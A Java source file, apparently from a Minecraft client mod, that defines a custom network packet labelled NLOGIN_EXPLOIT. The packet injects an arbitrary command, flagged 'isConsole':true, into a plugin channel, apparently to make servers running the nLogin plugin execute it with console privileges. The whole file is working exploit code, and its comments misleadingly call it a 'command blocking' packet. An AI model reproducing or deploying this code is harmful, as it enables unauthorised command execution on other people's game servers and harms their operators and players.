package dev.wrrulosdev.mcpclient.client.payloads;

import dev.wrrulosdev.mcpclient.client.constants.IdentifierConstants;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Objects;

public record NLoginPayloadPacket(String command) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, NLoginPayloadPacket> CODEC = CustomPayload.codecOf(NLoginPayloadPacket::write, NLoginPayloadPacket::new);
    public static final Id<NLoginPayloadPacket> ID = new Id<>(IdentifierConstants.NLOGIN_EXPLOIT);

    /**
     * Private constructor used for deserialization of the packet.
     *
     * @param buf The buffer containing the serialized packet data.
     * This constructor is used for reading the packet data from the buffer and
     * initializing the NLoginPayloadPacket object.
     */
    private NLoginPayloadPacket(PacketByteBuf buf) {
        this(buf.readString());
    }

    /**
     * Sends the command blocking data packet to the server.
     * This method constructs a new NLoginPayloadPacket with the specified
     * command and sends it via the network handler to the server.
     *
     * @param command The command that is being blocked.
     */
    public static void send(String command) {
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler())
            .sendPacket(new CustomPayloadC2SPacket(new NLoginPayloadPacket(command)));
    }

    /**
     * Serializes the packet data into the provided buffer.
     * This method writes the packet's data into the buffer by first converting it into a byte array.
     * It includes a channel name and the command being blocked, then writes it into the buffer.
     *
     * @param buf The buffer where the packet data will be written to.
     */
    public void write(PacketByteBuf buf) {
        try {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            DataOutputStream out = new DataOutputStream(stream);
            out.writeUTF("{\"id\":4,\"action\":1,\"command\":\"" + command + "\",\"isConsole\":true}\n");
            buf.writeBytes(stream.toByteArray());

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Gets the ID of this custom payload packet.
     * This method returns the ID used to identify this custom packet in communication with the server.
     *
     * @return The ID representing this custom payload packet.
     */
    public Id<NLoginPayloadPacket> getId() {
        return ID;
    }
}
